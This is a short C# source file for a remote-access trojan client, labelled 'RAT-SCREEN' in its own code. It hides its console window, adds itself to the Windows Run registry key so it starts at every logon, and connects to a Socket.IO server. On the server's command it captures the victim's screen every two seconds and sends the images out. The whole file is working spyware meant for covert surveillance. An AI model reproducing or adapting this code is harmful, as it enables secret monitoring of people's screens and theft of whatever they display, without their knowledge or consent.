using Microsoft.Win32;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace client
{
	public class Program
	{
		private static SocketIOClient.SocketIO _client;
		private static bool _isScreenshootSending = false;
		private static void Main()
		{
			var handle = GetConsoleWindow();

			// Hide
			ShowWindow(handle, SW_HIDE);
			SetStartup();

			Connect();

			_client.On("screenshoot-sending", (data) =>
			{
				_isScreenshootSending = data.GetValue<bool>();
				ScreenshotExecutor();
			});

			Console.ReadLine();
		}

		private static void SetStartup()
		{
			Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key.SetValue("RAT-SCREEN", Application.ExecutablePath);
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		const int SW_HIDE = 0;
		const int SW_SHOW = 5;



		private static async void ScreenshotExecutor()
		{
			if (_isScreenshootSending == false) return;

			while (_isScreenshootSending)
			{
				await Task.Delay(TimeSpan.FromSeconds(2));
				SendScreen();
			}
		}

		private static void SendScreen()
		{
			var pathScreen = CreateScreenshot();
			var bytes = ConvertJPEGToBytes(pathScreen);

			Send("screenshoot", bytes, pathScreen);
		}

		private static void Send(string eventName, object bytes, object name)
		{
			_client.EmitAsync(eventName, bytes, name);
		}

		private static string CreateScreenshot()
		{
			var date = DateTime.Now;

			int screenWidth = SystemInformation.VirtualScreen.Width;
			int screenHeight = SystemInformation.VirtualScreen.Height;

			Bitmap captureBitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);

			Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

			Graphics captureGraphics = Graphics.FromImage(captureBitmap);

			captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

			var path = $@"C:\Users\Mrrebrik\Desktop\Screen_{date.Day}_{date.Month}_{date.Year}_{date.Hour}_{date.Minute}_{date.Second}.jpg";

			captureBitmap.Save(path, ImageFormat.Jpeg);

			return path;
		}

		private static byte[] ConvertJPEGToBytes(string path)
		{
			Bitmap bmp = new Bitmap(path);

			MemoryStream ms = new MemoryStream();

			bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);

			byte[] bmpBytes = ms.GetBuffer();

			bmp.Dispose();
			ms.Close();

			return bmpBytes;
		}

		private static void Connect()
		{
			_client = new SocketIOClient.SocketIO("http://localhost:3000");

			_client.ConnectAsync();
		}
	}
}
